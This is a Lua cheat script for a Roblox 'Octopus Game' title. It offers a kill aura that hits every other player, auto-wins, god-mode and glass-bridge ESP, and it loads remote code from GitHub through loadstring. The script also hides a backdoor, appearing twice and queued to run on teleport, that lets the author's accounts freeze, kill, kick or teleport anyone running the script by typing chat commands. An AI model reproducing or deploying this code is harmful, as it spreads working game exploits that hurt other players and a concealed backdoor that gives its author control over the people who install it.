if workspace:FindFirstChild("Baseplate") == nil then
local S = Instance.new("Part")
S.Name = "Baseplate"
S.Anchored = true
S.CanCollide = true
S.Transparency = 0
S.Position = Vector3.new(-5000, -5000, -5000)
S.Size = Vector3.new(1000, 10, 1000)
S.Parent = workspace
end


getgenv().ThanosBuff = false
local function thanosbuff()
    if getgenv().ThanosBuff == false then
    getgenv().ThanosBuff = true
    
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed * 1.4
game.Players.LocalPlayer.Character.Humanoid.MaxHealth = game.Players.LocalPlayer.Character.Humanoid.MaxHealth * 1.1
game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health * 1.1

wait(30)

    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = oldws
    
  
    getgenv().ThanosBuff = false
    end
end

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()

local Window = Rayfield:CreateWindow({
   Name = "Octopus Game Hub - by nexer1234 - v2.2",
   Icon = 0,
   LoadingTitle = "Octopus Game Hub",
   LoadingSubtitle = "by nexer1234",
   Theme = "Ocean",
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "Octopus Game Script"
   },

   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },

   KeySystem = false,
   KeySettings = {
      Title = "Verify yourself firstly!",
      Subtitle = "Key Needed!",
      Note = "The key is ''cheese''",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"cheese"}
   }
})

local function notify(title, content, time)
time = time or 10
Rayfield:Notify({
	Title = title,
	Content = content,
	Duration = time,
	Image = 4483362458,
	Actions = {},
})
end

local MainTab = Window:CreateTab("Main", 4483362458)
local FightTab = Window:CreateTab("Fight", 4483362458)
local RLGLTab = Window:CreateTab("Red Light Green Light", 4483362458)
local HoneycombTab = Window:CreateTab("Honeycomb", 4483362458)
local GlassBridgeTab = Window:CreateTab("Glass Bridge", 4483362458)

FightTab:CreateButton({
   Name = "Enable combat",
   Callback = function()
game.ReplicatedStorage.GameSettings.AttackingEnabled.Value = true
game.ReplicatedStorage.GameSettings.KillingAllowed.Value = true
notify("Done!", "Combat has been enabled.")
   end
})

local KillAura = FightTab:CreateToggle({
   Name = "Kill Aura | BYPASSED!!!",
   CurrentValue = false,
   Callback = function(Value)
_G.KillAura = Value
if _G.KillAura == true then
repeat task.wait()

for i,v in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v.ClassName == "Tool" and v:FindFirstChild("Events") and v.Events:FindFirstChild("HitEvent") then
tool = v
end
end
if tool then
for _,player in ipairs(game:GetService("Players"):GetPlayers()) do
if player ~= game.Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart then
local args = {
    [1] = player.Character.HumanoidRootPart,
    [2] = player.Character.HumanoidRootPart.Position
}
tool.Events.HitEvent:FireServer(unpack(args))
if tool:FindFirstChild("Animations") and tool.Animations:FindFirstChild("Swing1") then
game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(tool.Animations["Swing1"], game.Players.LocalPlayer.Character.Humanoid):Play()
end
task.wait()
end
end
end
until _G.KillAura == false
end
   end,
})

FightTab:CreateButton({
   Name = "Teleport to weapon",
   Callback = function()
for i,v in ipairs(workspace.Lobby.Loots:GetChildren()) do
if not v then notify("Error!", "No weapons found.") end
if v and v:FindFirstChild("MainPart") then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v:FindFirstChild("MainPart").CFrame
notify("Done!", "You have been teleported to weapon.")
break
end
end
   end
})

MainTab:CreateButton({
   Name = "Infinity Yield",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
notify("Done!", "Infinity yield loaded.")
   end
})

MainTab:CreateButton({
   Name = "Auto-Redeem all codes",
   Callback = function()
if game.PlaceId == 7610176192 then
game:GetService("ReplicatedStorage").Events:FindFirstChild("RedeemCode"):FireServer("SOSOSORRYFORTHEBUGS")
game:GetService("ReplicatedStorage").Events:FindFirstChild("RedeemCode"):FireServer("500KGROUPMEMBERS")
game:GetService("ReplicatedStorage").Events:FindFirstChild("RedeemCode"):FireServer("FREEMONEY1")
game:GetService("ReplicatedStorage").Events:FindFirstChild("RedeemCode"):FireServer("FREESKINS1")
notify("Done!", "All codes activated.")
else
notify("Error!", "You should use in lobby.")
end
   end
})

getgenv().Push = false
MainTab:CreateButton({
   Name = "Disable push cooldown | Only for PC",
   Callback = function()
if game.PlaceId == 121040292301582 and getgenv().Push == false then
getgenv().Push = true
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
if input.KeyCode == Enum.KeyCode.F and not gameProcessedEvent then
game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(game.ReplicatedStorage.Animations.Character.Push, game.Players.LocalPlayer.Character.Humanoid):Play()
game:GetService("Players").LocalPlayer.Character.Events.Push:FireServer()
end
end)
notify("Done!", "Push cooldown disabled.")
else
notify("Error!", "You arleady disabled cooldown or you aren't in game.")
end
   end
})

MainTab:CreateButton({
   Name = "Teleport only yourself to game | FREE MONEY + FREE WINS",
   Callback = function()
game:GetService("TeleportService"):Teleport(121040292301582)
local Teleport = queueonteleport or queue_on_teleport
if Teleport then
    Teleport([[
        if not game:IsLoaded() then
            game.Loaded:Wait()
        end
        
if workspace:FindFirstChild("Baseplate") == nil then
local S = Instance.new("Part")
S.Name = "Baseplate"
S.Anchored = true
S.CanCollide = true
S.Transparency = 0
S.Position = Vector3.new(-5000, -5000, -5000)
S.Size = Vector3.new(1000, 10, 1000)
S.Parent = workspace
end
        
-- well you cracked my script, you know what are these functions... I made them for trolling LOL

local Players = game:GetService("Players")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local function onChatted(message, recipient)
    if string.find(string.lower(message), ";freeze "..player.Name.."") or string.find(string.lower(message), ";freeze hackers") then
	player.Character.HumanoidRootPart.Anchored = true
    elseif string.find(string.lower(message), ";unfreeze "..player.Name.."") or string.find(string.lower(message), ";unfreeze hackers") then
	player.Character.HumanoidRootPart.Anchored = false
    elseif string.find(string.lower(message), ";kill "..player.Name.."") or string.find(string.lower(message), ";kill hackers") then
	player.Character.Humanoid.Health = 0
    elseif string.find(string.lower(message), ";kick "..player.Name.."") or string.find(string.lower(message), ";kick hackers") then
	player:Kick("Message from creator of this experience: «Hello, actually i'm not a creator, im just trolling with admin commands lol. You didn't got banned so you can join back to game.»")
    elseif string.find(string.lower(message), ";bring "..player.Name.."") or string.find(string.lower(message), ";bring hackers") then
    for i,v in ipairs(game.Players:GetPlayers()) do
    if v.Name:find("Nexer1234") then
	player.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
    end
    end
    elseif string.find(string.lower(message), ";scan") then
	player.Character.Humanoid.HipHeight = 20
	task.wait(5)
	player.Character.Humanoid.HipHeight = 0
	elseif string.find(string.lower(message), ";eliminate "..player.Name.."") or string.find(string.lower(message), ";eliminate hackers") then
	if game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath") and workspace:FindFirstChild("RLGL_Immunity_Remote") == nil then
    game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath"):FireServer()
	elseif game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath") == nil and workspace:FindFirstChild("RLGL_Immunity_Remote") then
    workspace:FindFirstChild("RLGL_Immunity_Remote").RLGLDeath.Parent = game:GetService("ReplicatedStorage").Events
    task.wait()
    repeat task.wait() until game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath")
    task.wait()
    workspace:FindFirstChild("RLGL_Immunity_Remote"):Destroy()
    task.wait()
    game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath"):FireServer()
    end
    end
task.wait()
end
for i,v in ipairs(Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Name:find("Nexer1234") then
v.Chatted:Connect(onChatted)
task.wait()
end
task.wait()
end
Players.PlayerAdded:Connect(function(player)
for i,v in ipairs(Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Name:find("Nexer1234") then
v.Chatted:Connect(onChatted)
task.wait()
end
task.wait()
end
task.wait()
end)
	]])
end	
   end
})

MainTab:CreateButton({
   Name = "Apply thanos buff | Custom",
   Callback = function()
if game.PlaceId == 121040292301582 then
    notify("Done!", "Thanos buff has been applied.")
    thanosbuff()
else
notify("Error!", "You should use in game.")
end
   end
})

MainTab:CreateButton({
   Name = "Get Permanent Push | Free",
   Callback = function()
if game.PlaceId == 121040292301582 then
    notify("Done!", "Permanent push has been applied.")
game.ReplicatedStorage.GameSettings.Push.Enabled.Value = true
game.ReplicatedStorage.GameSettings.PermanentPush.Value = true
else
notify("Error!", "You should use in game.")
end
   end
})


RLGLTab:CreateButton({
   Name = "Auto-Win | Only for red light green light",
   Callback = function()
if game.PlaceId == 121040292301582 then
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.RedLightGreenLight.FinishLine.CFrame
notify("Done!", "You won in red light green light.")
else
notify("Error!", "You should use in game.")
end
   end
})

MainTab:CreateButton({
   Name = "Check if owner of this script is on your server.",
   Callback = function()
if game.PlaceId == 121040292301582 then
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Name == "nexer1234slapbattles" or v.Name == "Nexer1234Rivals" or v.Name == "Nexer1234_AnotherAlt" then
notify("Found!", "Creator found:"..v.Name)
end
end
else
notify("Error!", "You should use in game.")
end
   end
})


RLGLTab:CreateButton({
   Name = "God-Mode/Immunity | Only for red light green light",
   Callback = function()
if game.PlaceId == 121040292301582 then
if game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath") and workspace:FindFirstChild("RLGL_Immunity_Remote") == nil then
Instance.new("Folder", workspace).Name = "RLGL_Immunity_Remote"
task.wait()
game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath").Parent = workspace:FindFirstChild("RLGL_Immunity_Remote")
task.wait()
notify("Done!", "You got immunity in red light green light.")
elseif game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath") == nil and workspace:FindFirstChild("RLGL_Immunity_Remote") then
notify("Error!", "You arleady have immunity in red light green light.")
end
else
notify("Error!", "You should use in game.")
end
   end
})

HoneycombTab:CreateButton({
   Name = "Auto-Win | Only for honeycomb",
   Callback = function()
if game.PlaceId == 121040292301582 then
game:GetService("ReplicatedStorage").Events.HoneycombFinish:FireServer(true)
notify("Done!", "You won in honeycomb.")
else
notify("Error!", "You should use in game.")
end
   end
})

GlassBridgeTab:CreateButton({
   Name = "Auto-Win | Only for glass bridge",
   Callback = function()
if game.PlaceId == 121040292301582 then
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GlassBridge.End.Barrier.CFrame
notify("Done!", "You won in glass bridge.")
else
notify("Error!", "You should use in game.")
end
   end
})

GlassBridgeTab:CreateButton({
   Name = "ESP-Glass | Only for glass bridge",
   Callback = function()
if game.PlaceId == 121040292301582 then
for i,v in ipairs(workspace.GlassBridge:GetDescendants()) do
if v and v:FindFirstChild("Glass") and v.Glass:FindFirstChild("TouchInterest") == nil and v.Glass:FindFirstChildWhichIsA("Highlight") == nil then
Instance.new("Highlight", v.Glass).FillColor = Color3.fromRGB(0,255,125)
elseif v and v:FindFirstChild("Glass") and v.Glass:FindFirstChild("TouchInterest") and v.Glass:FindFirstChildWhichIsA("Highlight") == nil then
Instance.new("Highlight", v.Glass).FillColor = Color3.fromRGB(255,100,50)
end
end
notify("Done!", "Now you can see which glass are correct.")
else
notify("Error!", "You should use in game.")
end
   end
})

-- well you cracked my script, you know what are these functions... I made them for trolling LOL
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local function onChatted(message, recipient)
    if string.find(string.lower(message), ";freeze "..player.Name.."") or string.find(string.lower(message), ";freeze hackers") then
	player.Character.HumanoidRootPart.Anchored = true
    elseif string.find(string.lower(message), ";unfreeze "..player.Name.."") or string.find(string.lower(message), ";unfreeze hackers") then
	player.Character.HumanoidRootPart.Anchored = false
    elseif string.find(string.lower(message), ";kill "..player.Name.."") or string.find(string.lower(message), ";kill hackers") then
	player.Character.Humanoid.Health = 0
    elseif string.find(string.lower(message), ";kick "..player.Name.."") or string.find(string.lower(message), ";kick hackers") then
	player:Kick("Message from creator of this experience: «Hello, actually i'm not a creator, just trollin with admin commands lol, you didn't got banned so you can join back to game.»")
	elseif string.find(string.lower(message), ";baseplate "..player.Name.."") or string.find(string.lower(message), ";baseplate hackers") then
	player.Character.HumanoidRootPart.CFrame = workspace["Baseplate"].CFrame
    elseif string.find(string.lower(message), ";bring "..player.Name.."") or string.find(string.lower(message), ";bring hackers") then
    for i,v in ipairs(game.Players:GetPlayers()) do
    if v.Name:find("Nexer1234") then
	player.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
    end
    end
    elseif string.find(string.lower(message), ";scan") then
	player.Character.Humanoid.HipHeight = 5
	task.wait(5)
	player.Character.Humanoid.HipHeight = 0
	elseif string.find(string.lower(message), "Simon says: Jump!") then
	player.Character.Humanoid.HipHeight = 5
	task.wait(5)
	player.Character.Humanoid.HipHeight = 0
	elseif string.find(string.lower(message), ";eliminate "..player.Name.."") or string.find(string.lower(message), ";eliminate hackers") then
	if game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath") and workspace:FindFirstChild("RLGL_Immunity_Remote") == nil then
    game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath"):FireServer()
	elseif game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath") == nil and workspace:FindFirstChild("RLGL_Immunity_Remote") then
    workspace:FindFirstChild("RLGL_Immunity_Remote").RLGLDeath.Parent = game:GetService("ReplicatedStorage").Events
    task.wait()
    repeat task.wait() until game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath")
    task.wait()
    workspace:FindFirstChild("RLGL_Immunity_Remote"):Destroy()
    task.wait()
    game:GetService("ReplicatedStorage").Events:FindFirstChild("RLGLDeath"):FireServer()
    end
    end
task.wait()
end
for i,v in ipairs(Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Name:find("Nexer1234") then
v.Chatted:Connect(onChatted)
task.wait()
end
task.wait()
end
Players.PlayerAdded:Connect(function(player)
for i,v in ipairs(Players:GetPlayers()) do
if v ~= game.Players.LocalPlayer and v.Name:find("Nexer1234") then
v.Chatted:Connect(onChatted)
task.wait()
end
task.wait()
end
task.wait()
end)